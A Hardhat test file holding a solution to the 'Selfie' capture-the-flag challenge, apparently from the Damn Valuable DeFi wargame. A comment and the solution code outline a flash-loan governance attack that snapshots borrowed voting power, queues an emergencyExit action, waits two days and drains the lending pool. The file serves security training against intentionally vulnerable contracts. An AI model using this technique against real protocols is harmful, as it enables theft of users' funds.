const { ethers } = require("hardhat");
const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Selfie", function () {
  let deployer, player;
  let token, governance, pool;

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory("DamnValuableTokenSnapshot", deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory("SimpleGovernance", deployer)
    ).deploy(token.address);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory("SelfiePool", deployer)
    ).deploy(token.address, governance.address);
    expect(await pool.token()).to.eq(token.address);
    expect(await pool.governance()).to.eq(governance.address);

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token.address, 0)).to.eq(0);
  });

  /**
   * Notable attack vectors to consider here are the fact that anyone can
   * snapshot the balance of the governance token anytime. The Governance Dao contract
   * allows anyone with more than half the total supply of the token (enough power) to queue any arbitrarily
   * governance action. This allows us to flash loan a bulk of the tokens, submit a governance proposal
   * with a malicious code (in this case, `emergencyExit` from the lending pool), and then execute it
   * at a later date (2 days in this case due to ACTION_DELAY_IN_SECONDS)
   *
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const selfiePoolAttackerFactory = await ethers.getContractFactory(
      "SelfiePoolAttacker",
      player
    );
    const selfiePoolAttacker = await selfiePoolAttackerFactory.deploy(
      pool.address,
      governance.address
    );
    await selfiePoolAttacker.prepareAttack();

    // increase time by 2 days
    await time.increase(time.duration.days(2));

    await selfiePoolAttacker.drainFunds();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
